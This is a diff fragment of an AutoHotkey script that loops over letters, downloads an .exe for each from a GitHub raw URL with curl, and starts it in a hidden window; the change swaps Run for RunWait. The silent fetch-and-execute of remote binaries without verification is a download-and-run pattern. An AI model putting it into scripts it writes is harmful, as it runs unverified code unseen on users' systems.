@@ -14,7 +14,7 @@ for letter in letters {
     if !FileExist(output) {
         url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".exe"
         command := 'cmd /c curl -L -o "' . output . '" "' . url . '" & start ' . output
-        Run command, , "Hide"
+        RunWait command, , "Hide"
     }
 }
 
